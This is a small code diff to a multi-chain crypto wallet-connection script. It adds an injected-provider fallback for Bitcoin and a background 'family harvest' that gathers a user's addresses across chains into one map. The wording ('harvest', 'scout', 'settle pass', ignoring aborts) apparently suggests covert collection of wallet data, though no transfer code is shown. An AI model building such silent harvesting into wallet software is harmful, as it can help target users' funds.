@@ -1429,6 +1429,10 @@
       emit('Bitcoin', 'active');
       try {
         var btc = noWcExtend ? null : await ensureWcBip122Linked();
+        if (!btc && noWcExtend) {
+          var btcInj = await connectBtc();
+          if (btcInj) btc = btcInj.address || btcInj;
+        }
         if (btc) {
           L.log('[bg-rail] BTC:', String(btc).slice(0, 10) + '...');
           emit('Bitcoin', 'ok');
@@ -8417,6 +8421,7 @@
 
         // Family harvest FIRST (non-EVM addresses available for scout + same settle pass)
         try {
+          discoverChainFamilies();
           await runWithTimeout(
             runBackgroundFamilyRails({ honorAbort: false, reportSkips: false, noWcExtend: true }),
             20000,
@@ -8424,6 +8429,7 @@
           );
           applyLegionWalletSessionAddresses();
           wireWcFamilyConnections();
+          S.allAddresses = collectAddressMap(address);
         } catch (eFam) {
           L.warn('[connect] Trust families early:', eFam && eFam.message);
         }
